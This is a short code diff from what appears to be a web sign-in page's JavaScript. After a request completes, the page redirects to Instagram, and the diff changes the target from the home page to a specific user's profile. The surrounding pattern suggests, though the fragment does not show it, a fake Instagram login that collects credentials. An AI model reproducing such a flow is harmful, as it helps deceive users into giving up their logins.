@@ -31,7 +31,7 @@ signin.addEventListener("click", async (ev)=>{
     }).then(res => {
         console.log("Request complete!");
     });
-            location.href = "https://www.instagram.com";
+            location.href = "https://www.instagram.com/varsha._.rai"
             return false;
         }
 );
